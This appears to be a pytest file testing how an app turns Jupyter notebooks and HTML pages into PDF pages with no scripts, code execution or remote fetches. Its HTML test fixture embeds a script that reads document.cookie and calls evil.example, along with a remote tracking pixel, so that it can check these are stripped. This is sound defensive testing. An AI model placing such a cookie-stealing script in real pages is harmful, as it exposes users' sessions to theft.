"""Jupyter notebooks and HTML pages, imported as pages.

The files are built here, so each test says what the file holds and checks
what reached the page. The properties that matter most are the ones about
what is *not* done: no code is run, no script survives, and nothing is
fetched from the web when a file is opened.
"""

from __future__ import annotations

import base64
import json
from pathlib import Path

import pymupdf
import pytest
from fastapi.testclient import TestClient

from app.ingestion import notebook as nb
from app.integrations.google_drive import DriveFile


def _png(color: tuple[int, int, int] = (200, 30, 30), size: int = 40) -> bytes:
    pixmap = pymupdf.Pixmap(pymupdf.csRGB, pymupdf.IRect(0, 0, size, size))
    pixmap.set_rect(pixmap.irect, color)
    return pixmap.tobytes("png")


PNG = base64.b64encode(_png()).decode()


def _notebook(*cells: dict) -> bytes:
    return json.dumps({"nbformat": 4, "nbformat_minor": 5, "metadata": {}, "cells": cells}).encode()


def _markdown(source: str, **extra) -> dict:
    return {"cell_type": "markdown", "metadata": {}, "source": source.splitlines(True), **extra}


def _code(source: str, *outputs: dict) -> dict:
    return {
        "cell_type": "code",
        "metadata": {},
        "execution_count": 1,
        "source": source,
        "outputs": list(outputs),
    }


TUTORIAL = _notebook(
    _markdown(
        "# Tutorial 2\n## Training a network\n\nWe use **cross-entropy** and `nn.Module`, "
        "with $L = -\\sum_i y_i \\log p_i$ and a < b.\n\n"
        "- first point\n- second point\n\n"
        "| Split | Count |\n|---|---|\n| Train | 2000 |\n"
    ),
    _code(
        "import torch\nprint('ready')",
        {"output_type": "stream", "name": "stdout", "text": ["ready\n"]},
        {"output_type": "display_data", "data": {"image/png": PNG, "text/plain": "<Figure>"}},
    ),
    _markdown("## Backpropagation\n\n" + "Gradients flow backwards through the layers. " * 12),
    _code(
        "1 / 0",
        {
            "output_type": "error",
            "ename": "ZeroDivisionError",
            "evalue": "division by zero",
            "traceback": ["\x1b[0;31mZeroDivisionError\x1b[0m: division by zero"],
        },
    ),
)


def _text(doc) -> str:
    """Page text read the way the importer reads it: ligatures split into letters."""
    flags = pymupdf.TEXTFLAGS_TEXT & ~pymupdf.TEXT_PRESERVE_LIGATURES
    return "\n".join(page.get_text("text", flags=flags) for page in doc)


def _render(tmp_path: Path, name: str, data: bytes):
    path = tmp_path / name
    path.write_bytes(data)
    render = nb.render_notebook_to_pdf if name.endswith(".ipynb") else nb.render_html_to_pdf
    deck = render(path, max_slides=50)
    return deck, pymupdf.open(stream=deck.pdf, filetype="pdf")


# --- a notebook --------------------------------------------------------------------------
def test_a_notebook_becomes_pages_of_its_text_code_outputs_and_figures(tmp_path: Path):
    deck, doc = _render(tmp_path, "tutorial.ipynb", TUTORIAL)
    assert deck.title == "Tutorial 2" and deck.warnings == []
    text = _text(doc)
    # Markdown is laid out, not shown as its markup...
    assert "Training a network" in text and "## Training" not in text
    assert "cross-entropy" in text and "**" not in text
    assert "first point" in text and "Split" in text and "2000" in text
    # ...mathematics stays as the source the author wrote, and "<" is a less-than sign.
    assert "\\sum_i y_i" in text and "a < b" in text
    # The code is shown and so is what it printed when the author ran it.
    assert "import torch" in text and "ready" in text
    assert "ZeroDivisionError: division by zero" in text and "\x1b" not in text
    assert sum(len(page.get_images()) for page in doc) == 1
    # A section heading after real content opens a page; the subtitle under the title does not.
    assert deck.slide_count == 2
    assert doc[0].get_text().startswith("Tutorial 2")
    assert doc[1].get_text().lstrip().startswith("Backpropagation")


def test_a_picture_pasted_into_a_markdown_cell_is_kept(tmp_path: Path):
    cell = _markdown(
        "# Slide A-10\n\n![diagram](attachment:slide.png)\n",
        attachments={"slide.png": {"image/png": PNG}},
    )
    deck, doc = _render(tmp_path, "attached.ipynb", _notebook(cell))
    assert len(doc[0].get_images()) == 1 and deck.warnings == []


def test_long_output_is_clipped_and_a_progress_bar_keeps_its_last_state(tmp_path: Path):
    lines = "".join(f"epoch {i}\n" for i in range(500))
    bar = " 10%|#\r 50%|#####\r100%|##########\n"
    deck, doc = _render(
        tmp_path,
        "long.ipynb",
        _notebook(
            _markdown("# Training"),
            _code("train()", {"output_type": "stream", "name": "stdout", "text": lines + bar}),
        ),
    )
    text = _text(doc)
    assert "epoch 0" in text and "epoch 499" in text and "epoch 250" not in text
    assert "more lines" in text and "100%" in text and "10%|#" not in text
    assert deck.slide_count <= 3


def test_what_is_not_a_notebook_is_refused(tmp_path: Path):
    for name, data in [
        ("broken.ipynb", b"{not json"),
        ("list.ipynb", b"[1, 2]"),
        ("empty.ipynb", _notebook()),
        ("blank.ipynb", _notebook(_markdown("   "))),
    ]:
        path = tmp_path / name
        path.write_bytes(data)
        with pytest.raises(nb.UnreadableNotebookError):
            nb.render_notebook_to_pdf(path, max_slides=10)
    assert nb.looks_like_notebook(TUTORIAL, "anything.bin") is True
    assert nb.looks_like_notebook(b'{"name": "config"}', "settings.json") is False
    assert nb.looks_like_notebook(b"%PDF-1.7", "fake.ipynb") is False


# --- an HTML page ------------------------------------------------------------------------
PAGE = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Week 3 notes</title>
<style>body {{ display: none }}</style>
<script>window.stolen = document.cookie; fetch('https://evil.example/x');</script>
</head><body>
<nav>Home | About</nav>
<h1>Sampling<a class="anchor-link" href="#Sampling">&#182;</a></h1>
<div class="jp-InputPrompt">In [3]:</div>
<p>The rate must exceed <b>twice</b> the bandwidth &amp; no less.</p>
<div class="highlight"><pre><span class="k">def</span> <span class="nf">f</span>(x):
    <span class="k">return</span> x &lt; 2</pre></div>
<img src="data:image/png;base64,{PNG}" alt="spectrum">
<img src="https://tracker.example/pixel.png" alt="a remote figure">
<script>alert('still here')</script>
<p hidden>secret draft</p>
<form><input name="q"><button>Search</button></form>
</body></html>""".encode()


def test_an_html_page_keeps_its_structure_and_loses_everything_that_runs(tmp_path: Path):
    deck, doc = _render(tmp_path, "notes.html", PAGE)
    text = _text(doc)
    assert deck.title == "Week 3 notes"
    assert "Sampling" in text and "twice the bandwidth & no less" in text
    # Code keeps its line breaks and its text, without the highlighter's markup.
    assert "def f(x):" in text and "return x < 2" in text
    # Scripts, styles, navigation, forms, hidden text and export furniture are gone.
    for gone in (
        "stolen",
        "evil.example",
        "alert",
        "display: none",
        "Home | About",
        "Search",
        "secret draft",
        "In [3]",
        "¶",
    ):
        assert gone not in text, gone
    assert b"evil.example" not in deck.pdf and b"tracker.example" not in deck.pdf
    # The embedded picture is placed; the one on the web is never fetched, and that is said.
    assert sum(len(page.get_images()) for page in doc) == 1
    assert "a remote figure" in text
    assert len(deck.warnings) == 1 and "never fetched" in deck.warnings[0]


def test_an_html_file_is_known_by_its_opening_not_only_its_name(tmp_path: Path):
    assert nb.looks_like_html(PAGE, "notes.html") is True
    assert nb.looks_like_html(b"<html><body>x</body></html>", "saved-page") is True
    assert nb.looks_like_html(b"\x89PNG\r\n", "picture.html") is False
    assert nb.looks_like_html(b"just some words", "words.txt") is False
    path = tmp_path / "empty.html"
    path.write_bytes(b"<html><head><title>t</title></head><body><script>x()</script></body></html>")
    with pytest.raises(nb.UnreadableNotebookError):
        nb.render_html_to_pdf(path, max_slides=10)


def test_markdown_is_converted_the_way_notebooks_use_it():
    out = nb.markdown_to_html(
        "### Title\n\nA *word* and __strong__ and [a link](https://example.com/x).\n\n"
        "1. one\n2. two\n\n> quoted\n\n```python\nif a < b:\n    pass\n```\n\n---\n"
    )
    assert "<h3>Title</h3>" in out and "<i>word</i>" in out and "<b>strong</b>" in out
    # A link keeps its words and loses its address.
    assert "a link" in out and "example.com" not in out
    assert "<ol><li>one</li><li>two</li></ol>" in out.replace("\n", "")
    assert "<blockquote><p>quoted</p></blockquote>" in out
    assert "<pre>if a &lt; b:\n    pass</pre>" in out and "<hr>" in out
    # Arithmetic with asterisks is not emphasis.
    assert "<i>" not in nb.markdown_to_html("y = a * b * c")


# --- through the API ---------------------------------------------------------------------
def test_a_notebook_and_an_html_page_upload_and_read_like_a_lecture(
    client: TestClient, course: dict
):
    uploaded = client.post(
        f"/api/courses/{course['id']}/documents",
        files={"file": ("Tutorial_2.ipynb", TUTORIAL, "application/octet-stream")},
    )
    assert uploaded.status_code == 201, uploaded.text
    body = uploaded.json()
    assert body["status"] == "indexed" and body["page_count"] == 2 and body["warnings"] == []
    document = body["document"]
    assert document["media_type"] == "application/x-ipynb+json"
    assert document["extraction_meta"]["rendered_pdf"]
    # The reader and the slide view are given the laid-out PDF.
    served = client.get(f"/api/documents/{document['id']}/file")
    assert served.status_code == 200 and served.content[:5] == b"%PDF-"
    page = client.get(f"/api/documents/{document['id']}/pages/2").json()
    assert "Gradients flow backwards" in page["text"]

    page_html = client.post(
        f"/api/courses/{course['id']}/documents",
        files={"file": ("notes.html", PAGE, "text/html")},
    )
    assert page_html.status_code == 201, page_html.text
    assert page_html.json()["document"]["media_type"] == "text/html"
    assert any("never fetched" in warning for warning in page_html.json()["warnings"])

    refused = client.post(
        f"/api/courses/{course['id']}/documents",
        files={"file": ("notes.docx", b"PK\x03\x04 not a deck", "application/octet-stream")},
    )
    assert refused.status_code == 400 and "Jupyter notebooks" in refused.json()["detail"]


def test_drive_offers_notebooks_and_html_pages_whatever_it_calls_them():
    colab = DriveFile(id="1", name="Tutorial 2", mime_type="application/vnd.google.colaboratory")
    assert colab.importable and colab.imported_filename == "Tutorial 2.ipynb"
    assert colab.imported_media_type == "application/x-ipynb+json"
    named = DriveFile(id="2", name="lab.ipynb", mime_type="application/octet-stream")
    assert named.importable and named.imported_filename == "lab.ipynb"
    page = DriveFile(id="3", name="notes.html", mime_type="text/html")
    assert page.importable and page.imported_media_type == "text/html"
    other = DriveFile(id="4", name="essay.docx", mime_type="application/msword")
    assert not other.importable and "notebook" in other.why_skipped
